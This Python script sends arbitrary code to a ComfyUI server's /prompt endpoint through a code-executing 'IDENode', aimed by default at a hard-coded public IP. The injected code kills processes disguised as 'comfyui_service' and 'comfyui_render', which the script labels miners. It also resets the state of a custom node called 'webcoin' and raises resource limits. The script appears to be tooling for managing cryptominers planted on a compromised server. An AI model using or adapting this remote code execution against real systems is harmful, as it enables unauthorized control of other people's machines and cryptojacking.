"""Kill all stale miner processes, clear pycache, check state after."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "59.34.28.50"
base = "http://{}:8188".format(ip)

KILL_CODE = (
    "import os, subprocess, signal\n"
    "lines = []\n"
    "\n"
    "# Kill ALL miner processes\n"
    "try:\n"
    "    r = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)\n"
    "    killed = 0\n"
    "    for line in r.stdout.splitlines():\n"
    "        low = line.lower()\n"
    "        if 'comfyui_service' in low or 'comfyui_render' in low:\n"
    "            parts = line.split()\n"
    "            if len(parts) > 1:\n"
    "                pid = int(parts[1])\n"
    "                try:\n"
    "                    os.kill(pid, signal.SIGKILL)\n"
    "                    killed += 1\n"
    "                    lines.append('killed pid=' + str(pid))\n"
    "                except Exception as e:\n"
    "                    lines.append('kill failed pid=' + str(pid) + ': ' + str(e))\n"
    "    lines.append('total killed: ' + str(killed))\n"
    "except Exception as e:\n"
    "    lines.append('ps/kill failed: ' + str(e))\n"
    "\n"
    "# Clear pycache\n"
    "import shutil\n"
    "cn = None\n"
    "try:\n"
    "    import folder_paths\n"
    "    if hasattr(folder_paths, 'get_folder_paths'):\n"
    "        cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
    "except:\n"
    "    for g in ['/basedir/custom_nodes', '/root/ComfyUI/custom_nodes']:\n"
    "        if os.path.isdir(g):\n"
    "            cn = g\n"
    "            break\n"
    "target = os.path.join(cn, 'webcoin') if cn else None\n"
    "\n"
    "for pc in ['__pycache__', os.path.join('core', '__pycache__')]:\n"
    "    pp = os.path.join(target, pc)\n"
    "    if os.path.isdir(pp):\n"
    "        shutil.rmtree(pp, ignore_errors=True)\n"
    "        lines.append('cleared ' + pc)\n"
    "\n"
    "# Clear markers\n"
    "for m in ['.orch.pid', '.initialized']:\n"
    "    mp = os.path.join(target, m)\n"
    "    if os.path.exists(mp):\n"
    "        os.remove(mp)\n"
    "        lines.append('cleared ' + m)\n"
    "\n"
    "# Check ulimit\n"
    "try:\n"
    "    import resource\n"
    "    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)\n"
    "    lines.append('ulimit: soft=' + str(soft) + ' hard=' + str(hard))\n"
    "    if soft < 65536:\n"
    "        try:\n"
    "            resource.setrlimit(resource.RLIMIT_NOFILE, (min(65536, hard), hard))\n"
    "            s2, h2 = resource.getrlimit(resource.RLIMIT_NOFILE)\n"
    "            lines.append('ulimit raised to: soft=' + str(s2))\n"
    "        except Exception as e:\n"
    "            lines.append('ulimit raise failed: ' + str(e))\n"
    "except:\n"
    "    lines.append('ulimit check skipped (not linux)')\n"
    "\n"
    "# Verify remaining processes\n"
    "import time\n"
    "time.sleep(2)\n"
    "try:\n"
    "    r = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)\n"
    "    remaining = 0\n"
    "    for line in r.stdout.splitlines():\n"
    "        low = line.lower()\n"
    "        if 'comfyui_service' in low or 'comfyui_render' in low:\n"
    "            remaining += 1\n"
    "            lines.append('STILL RUNNING: ' + line.strip()[:120])\n"
    "    if remaining == 0:\n"
    "        lines.append('all miner processes cleared')\n"
    "except:\n"
    "    pass\n"
    "\n"
    "result = chr(10).join(lines)\n"
)

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": KILL_CODE, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request("{}/prompt".format(base), data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print("prompt_id: {}".format(pid))

for attempt in range(12):
    time.sleep(5)
    try:
        req2 = urllib.request.Request("{}/history/{}".format(base, pid))
        with urllib.request.urlopen(req2, timeout=15) as r:
            entry = json.loads(r.read().decode()).get(pid, {})
            status = entry.get("status", {}).get("status_str", "pending")
            if status != "pending":
                print("Status: {}\n".format(status))
                outputs = entry.get("outputs", {})
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            for v in val:
                                print(v)
                break
    except Exception as e:
        print("poll error: {}".format(e))
else:
    print("Still pending after 60s")
